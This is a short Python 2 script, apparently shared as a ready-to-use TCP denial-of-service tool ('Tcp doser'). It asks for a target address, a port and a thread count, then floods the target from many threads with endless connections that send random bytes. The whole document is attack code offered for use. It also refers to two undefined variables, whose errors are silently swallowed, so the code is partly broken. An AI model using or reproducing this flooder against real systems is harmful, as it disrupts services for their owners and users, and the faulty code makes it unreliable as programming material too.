import threading
import socket
import random
import time

print '''
###############################
######  ######    Tcp doser   #
##### () #####   by LeeOn123  #
####      ####                #
###############################'''
time.sleep(0.5)
ip = raw_input("Url/ip:")
port = input("Port:")
thread_num = input("Threads:")
print "Attacking !!! Thread:",thread_num

def run():
	data = random._urandom(1024)
	bytes = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((str(ip),int(port))) 
			s.send(bytes) 
			try:
				for y in range(multiple):
					s.send(str.encode(p))
			except:
				s.close()
		except:
				s.close() 

for i in range(thread_num):
    th = threading.Thread(target = run)
    th.start()